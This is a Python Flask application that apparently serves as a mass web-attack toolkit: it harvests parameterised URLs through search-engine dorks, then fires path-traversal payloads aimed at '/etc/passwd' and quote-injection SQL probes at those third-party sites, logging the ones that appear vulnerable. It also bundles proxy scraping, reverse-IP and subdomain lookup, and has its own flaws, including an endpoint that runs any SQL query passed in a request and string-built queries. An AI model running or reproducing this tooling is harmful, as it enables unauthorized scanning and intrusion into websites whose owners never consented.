import re
import time
import json
import random
import sqlite3
import urllib3
import datetime
from ipwhois import IPWhois
from bs4 import BeautifulSoup
from json2html import json2html
from urllib3 import Timeout, Retry
from flask import Flask, render_template, url_for, request
from multiprocessing import Pool, freeze_support

app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy_lst = []
domains_lst = []

payload = [
    r'../../../../../../../../../../../../../../../../../etc/passwd',
    r'../../../../../../../../../../../../../../../../../etc/passwd%00',
    r'/etc/passwd',
    r'/etc/passwd%00'
]

ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
      'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)']

header = {
    'User-agent': random.choice(ua),
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Connection': 'keep-alive'}

http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)


def builtwith(u, headers=None, html=None):
    techs = {}
    # Check URL
    for app_name, app_spec in data['apps'].items():
        if 'url' in app_spec:
            if contains(u, app_spec['url']):
                add_app(techs, app_name, app_spec)

    # Download content
    if None in (headers, html):
        try:
            req = http.request("GET", u)
            if headers is None:
                headers = req.headers
            if html is None:
                try:
                    ht = BeautifulSoup(req.data, features="html.parser")
                    html = ht.prettify()
                except Exception as exc:
                    print(str(exc))
                    html = req.data.decode("latin-1")
        except Exception as e:
            print('Error:', e)

    # Check headers
    if headers:
        for app_name, app_spec in data['apps'].items():
            if 'headers' in app_spec:
                if contains_dict(headers, app_spec['headers']):
                    add_app(techs, app_name, app_spec)

    # Check html
    if html:
        for app_name, app_spec in data['apps'].items():
            for key in 'html', 'script':
                snippets = app_spec.get(key, [])
                if not isinstance(snippets, list):
                    snippets = [snippets]
                for snippet in snippets:
                    if contains(html, snippet):
                        add_app(techs, app_name, app_spec)
                        break

        # check meta
        # XXX add proper meta data parsing
        if isinstance(html, bytes):
            html = html.decode()
        metas = dict(re.compile('<meta[^>]*?name=[\'"]([^>]*?)[\'"][^>]*?content=[\'"]([^>]*?)[\'"][^>]*?>',
                                re.IGNORECASE).findall(html))
        for app_name, app_spec in data['apps'].items():
            for name, content in app_spec.get('meta', {}).items():
                if name in metas:
                    if contains(metas[name], content):
                        add_app(techs, app_name, app_spec)
                        break
    return techs


def add_app(techs, app_name, app_spec):
    for category in get_categories(app_spec):
        if category not in techs:
            techs[category] = []
        if app_name not in techs[category]:
            techs[category].append(app_name)
            implies = app_spec.get('implies', [])
            if not isinstance(implies, list):
                implies = [implies]
            for app_name in implies:
                add_app(techs, app_name, data['apps'][app_name])


def get_categories(app_spec):
    return [data['categories'][str(c_id)] for c_id in app_spec['cats']]


def contains(v, regex):
    if isinstance(v, bytes):
        v = v.decode()
    if len(v) > 870000:
        string_len = len(v)
        part_size = string_len // 1000
        step = part_size
        for _ in range(string_len // part_size):
            part = v[:step]
            v = v[step - 1:]
            step += part_size
            if step > string_len:
                break
            res = re.compile(regex.split('\\;')[0], flags=re.IGNORECASE).search(part)
            if res:
                return res
    else:
        return re.compile(regex.split('\\;')[0], flags=re.IGNORECASE).search(v)


def contains_dict(d1, d2):
    for k2, v2 in d2.items():
        v1 = d1.get(k2)
        if v1:
            if not contains(v1, v2):
                return False
        else:
            return False
    return True


@app.route("/cmsinfo")
def cms_info():
    site = request.args.get("site", default="none", type=str)
    info = []
    info.clear()
    cms_inf = ''
    if site != "none":
        cms_inf = builtwith(site)
        for i in sorted(cms_inf.items()):
            print('%s: %s' % i)
            info.append('%s: %s' % i)

    return render_template("tools.html", data=json2html.convert(json=json.dumps(cms_inf, indent=4)),
                           tool="Site technologies")


@app.route("/whois")
def whois():
    ip = request.args.get("ip", default="none", type=str)
    result = {}
    if ip != "none":
        info = IPWhois(ip).lookup_rdap(depth=1)
        result['info'] = info
        entity = info['entities'][0]
        result['entity'] = entity
        name = info['objects'][entity]['contact']['name']
        result['name'] = name
        print(json.dumps(result, indent=4))

    return render_template("tools.html", whoisdata=json2html.convert(json=json.dumps(result, indent=4)), tool="Whois")


def dorker(dork):
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS dorker_urls (date_ TEXT, dork_ TEXT, url_ TEXT PRIMARY KEY)''')
    sql.execute('''CREATE TABLE IF NOT EXISTS urls_to_check (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    for page in range(1, 16):
        time.sleep(0.2)

        # SEARCH-RESULTS.COM
        try:
            send1 = http.request("GET", "http://www1.search-results.com/web?q=" + dork + "&page=" + str(page),
                                 retries=Retry(2), timeout=Timeout(4))
            try:
                parsing1 = BeautifulSoup(send1.data.decode('utf-8'), features="html.parser")
            except urllib3.exceptions.DecodeError:
                print("Trying latin-1...")
                parsing1 = BeautifulSoup(send1.data.decode('latin-1'), features="html.parser")

            for url in parsing1.find_all("cite"):
                print(url.string)

                if "=" in url.string:
                    sql.execute('''INSERT OR IGNORE INTO urls_to_check VALUES (?, ?)''', (str(datetime.date.today()),
                                                                                          str(url.string)))
                    sql.execute('''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)''', (str(datetime.date.today()),
                                                                                           str(dork), str(url.string)))
                    db.commit()
                else:
                    sql.execute('''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)''', (str(datetime.date.today()),
                                                                                           str(dork), str(url.string)))
                    db.commit()

        except Exception as ex:
            print("Error:\n" + str(ex))

        # KVASIR.NO
        try:
            send6 = http.request("GET", "https://www.kvasir.no/alle?offset=" + str(page * 10) + "&q=" + dork,
                                 retries=Retry(2), timeout=Timeout(4))

            try:
                parsing6 = BeautifulSoup(send6.data.decode('utf-8'), features="html.parser")
            except urllib3.exceptions.DecodeError:
                print("Trying latin-1...")
                parsing6 = BeautifulSoup(send6.data.decode('latin-1'), features="html.parser")

            for url in parsing6.find_all("p", class_="Source-sc-3jcynm-0 kBIaaJ"):
                print(str(url.string))
                if "=" in url.string:
                    sql.execute('''INSERT OR IGNORE INTO urls_to_check VALUES (?, ?)''', (str(datetime.date.today()),
                                                                                          str(url.string)))
                    sql.execute('''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)''', (str(datetime.date.today()),
                                                                                           str(dork), str(url.string)))
                    db.commit()
                else:
                    sql.execute('''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)''', (str(datetime.date.today()),
                                                                                           str(dork), str(url.string)))
                    db.commit()

        except Exception as ex:
            print("Error:\n" + str(ex))

    db.close()


@app.route("/dorker")
def dorker_route():
    # global pages_to_crawl
    # pages_to_crawl = request.args.get("pagesmax", default=10, type=int)
    # threads = request.args.get("threads", default=5, type=int)

    dorks = request.args.get("dorks", default="none", type=str)
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS dorker_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    if dorks != "none":
        dorks_list = dorks.split(",")
        print(dorks_list)

        pool = Pool(len(dorks_list))
        pool.map(dorker, dorks_list)
        pool.close()
        pool.join()

    return render_template("tools.html", data=sql.execute('''SELECT * FROM dorker_urls ORDER BY date_ DESC'''),
                           tool="Dorker")


def lfi_checker(url_list):
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()
    if "=" in url_list:
        if not str(url_list).startswith("https://cve.mitre") and not str(url_list).startswith("http://cve.mitre"):
            site = url_list.split("=")
            number_of_parameters = len(site)
            # 1
            if number_of_parameters == 2:
                try:
                    print("Trying " + site[0] + "=PAYLOAD")
                    for exploit in payload:
                        # Request with payload
                        http_request1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                     timeout=Timeout(9))
                        http_response1 = str(http_request1.data)

                        if "root:" in http_response1:
                            print("[+] Vulnerable URL: " + site[0] + "=" + exploit)
                            sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''',
                                        (str(datetime.date.today()), str(site[0] + "=" + exploit)))
                            db.commit()

                except urllib3.exceptions:
                    print("\n[!] Exception: " + str(url_list))

            # 2
            elif number_of_parameters == 3:
                try:
                    print("Trying " + str(url_list.split("&")[0]) + "&" + str(
                        url_list.split("&")[1].split("=")[0]) + "=PAYLOAD")
                    for exploit in payload:

                        # Request with payload
                        http_request2_1 = http.request("GET", str(url_list.split("&")[0]) + "&" +
                                                       str(url_list.split("&")[1].split("=")[0]) + "=" + exploit,
                                                       retries=Retry(4), timeout=Timeout(9))
                        http_response2_1 = str(http_request2_1.data)

                        if "root:" in http_response2_1:
                            print("[+] Vulnerable URL: " + str(url_list.split("&")[0]) + "&" +
                                  str(url_list.split("&")[1].split("=")[0]) + "=" + exploit)
                            sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''',
                                        (str(datetime.date.today()), str(url_list.split("&")[0]) + "&" +
                                         str(url_list.split("&")[1].split("=")[0]) + "=" + exploit))
                            db.commit()

                        # Request with payload
                        print(str(url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(
                            url_list.split("&")[1]))
                        http_request2_2 = http.request("GET", str(
                            url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(url_list.split("&")[1]),
                                                       retries=Retry(4), timeout=Timeout(9))
                        http_response2_2 = str(http_request2_2.data)
                        if "root:" in http_response2_2:
                            print("[+] Vulnerable URL: " + str(url_list.split("&")[0]) + "&" +
                                  str(url_list.split("&")[1].split("=")[0]) + "=" + exploit)
                            sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''',
                                        (str(datetime.date.today()), str(url_list.split("&")[0]) + "&" +
                                         str(url_list.split("&")[1].split("=")[0]) + "=" + exploit))
                            db.commit()

                except urllib3.exceptions:
                    print("\n[!] Exception: " + str(url_list))

            elif number_of_parameters > 4:
                try:
                    print("Trying " + site[0] + "=PAYLOAD")
                    for exploit in payload:
                        # Request with payload
                        http_request3_1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                       timeout=Timeout(9))
                        http_request3_1 = str(http_request3_1.data)
                        if "root:" in http_request3_1:
                            print("[+] Vulnerable URL: " + site[0] + "=" + exploit)
                            sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''',
                                        (str(datetime.date.today()), str(site[0] + "=" + exploit)))
                            db.commit()
                except urllib3.exceptions:
                    print("\n[!] Exception: " + str(url_list))

            else:
                pass


@app.route("/lfi")
def lfi_route():
    limit = request.args.get("limit", default="none", type=str)

    site_list = []
    site_list.clear()

    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    if limit != "none":
        for site in sql.execute("""SELECT url_ from urls_to_check ORDER BY date_ DESC LIMIT """ + limit):
            site_list.append(site[0])
        print(site_list)

        pool = Pool(25)
        pool.map(lfi_checker, site_list)
        pool.close()
        pool.join()

        for site in site_list:
            sql.execute("""DELETE FROM urls_to_check WHERE url_ = '""" + str(site) + "'")
            db.commit()

    return render_template("tools.html", data=sql.execute("""SELECT * from vuln_urls ORDER BY date_ DESC"""),
                           tool="LFI checker")


def sqli_checker(site):
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    error1 = "You have an error in your SQL syntax"
    error2 = "Warning: mysql_fetch_array()"
    error3 = "Error Occurred While Processing Request"
    if "=" in site:
        try:
            send = http.request("GET", str(site) + "'", retries=Retry(4), timeout=Timeout(5))
            p = BeautifulSoup(send.data, features="html.parser")
            parsing = p.prettify()

            if error1 in parsing:
                print(str(site) + " seems vulnerable!")
                sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(datetime.date.today()),
                                                                                  str(site + "'")))
                db.commit()

            elif error2 in parsing:
                print(str(site) + " seems vulnerable!")
                sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(datetime.date.today()),
                                                                                  str(site + "'")))
                db.commit()

            elif error3 in parsing:
                print(str(site) + " seems vulnerable!")
                sql.execute('''INSERT OR IGNORE INTO vuln_urls VALUES (?, ?)''', (str(datetime.date.today()),
                                                                                  str(site + "'")))
                db.commit()

            else:
                print(str(site) + " not vulnerable!")

        except Exception as exc:
            print("Error: " + str(exc))

    else:
        print("Skipping " + str(site))


@app.route("/sqli")
def sqli_route():
    limit = request.args.get("limit", default="none", type=str)

    site_list = []
    site_list.clear()

    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    if limit != "none":
        # WHERE 'url_' LIKE '%=%'
        for site in sql.execute("""SELECT url_ from urls_to_check ORDER BY date_ DESC LIMIT """ + limit):
            site_list.append(site[0])
        print(site_list)

        pool = Pool(25)
        pool.map(sqli_checker, site_list)
        pool.close()
        pool.join()

        for site in site_list:
            sql.execute("""DELETE FROM urls_to_check WHERE url_ = '""" + str(site) + "'")
            db.commit()

    return render_template("tools.html", data=sql.execute("""SELECT * from vuln_urls ORDER BY date_ DESC"""),
                           tool="SQLi checker")


@app.route("/reverse_ip")
def reverse_ip():
    ip = request.args.get("ip", default="none", type=str)
    domains_lst.clear()

    if ip != "none":
        send = http.request("GET", "https://reverseip.domaintools.com/search/?q=" + str(ip), retries=Retry(4),
                            timeout=Timeout(5))
        parsing = BeautifulSoup(send.data, features="html.parser")
        for d in parsing.find_all("span", title=str(ip)):
            if d.string is not None:
                domains_lst.append(d.string)

    return render_template("tools.html", data=domains_lst, tool="Reverse IP lookup")


@app.route("/subdomains")
def subdomains():
    domain = request.args.get("domain", default="none", type=str)
    domains_lst.clear()

    if domain != "none":
        send = http.request("GET", "https://dns.bufferover.run/dns?q=" + domain, retries=Retry(4),
                            timeout=Timeout(5))
        try:
            parsing = send.data.decode("utf-8")
        except Exception as exc:
            print("Error:\n" + str(exc) + "Trying latin-1...")
            parsing = send.data.decode('latin-1')
        json_response = json.loads(parsing)
        subdomain_list = json_response['FDNS_A']
        if subdomain_list is not None:
            for subdomain in subdomain_list:
                domains_lst.append(subdomain)

    return render_template("tools.html", data=domains_lst, tool="Subdomain lookup")


@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404


@app.route("/proxy")
def proxy():
    global proxy_lst
    p_type = request.args.get("type", default="http", type=str)

    try:
        req = http.request("GET", "https://api.proxyscrape.com/?request=getproxies&proxytype=" + p_type +
                           "&timeout=500&country=all", retries=Retry(3), timeout=Timeout(5))
        decoded = (req.data.decode("utf-8"))
        for url in decoded.split("\n"):
            if url not in proxy_lst:
                proxy_lst.append(url)
        return render_template("tools.html", data=proxy_lst, tool="Proxy scraper")
    except Exception as ex:
        print(str(ex))


@app.route("/sqlquery")
def sql_query():
    query = request.args.get("query", default="SELECT * from dorker_urls ORDER BY date_ DESC", type=str)
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql_data = sql.execute(query)

    return render_template("tools.html", data=sql_data, tool="Execute SQL query")


@app.route("/")
@app.route("/index.html")
def index():
    sort_by = request.args.get("sort", default="date_", type=str)
    db = sqlite3.connect("dorker.db")
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS dorker_urls (date_ TEXT, dork_ TEXT, url_ TEXT PRIMARY KEY)''')
    db.commit()

    return render_template("index.html", data=sql.execute('''SELECT * FROM dorker_urls ORDER BY %s DESC''' %
                                                                    sort_by))


if __name__ == '__main__':
    data = json.load(open("apps.json.py", "r"))
    freeze_support()
    app.run(debug=True, port=1337, use_reloader=False)
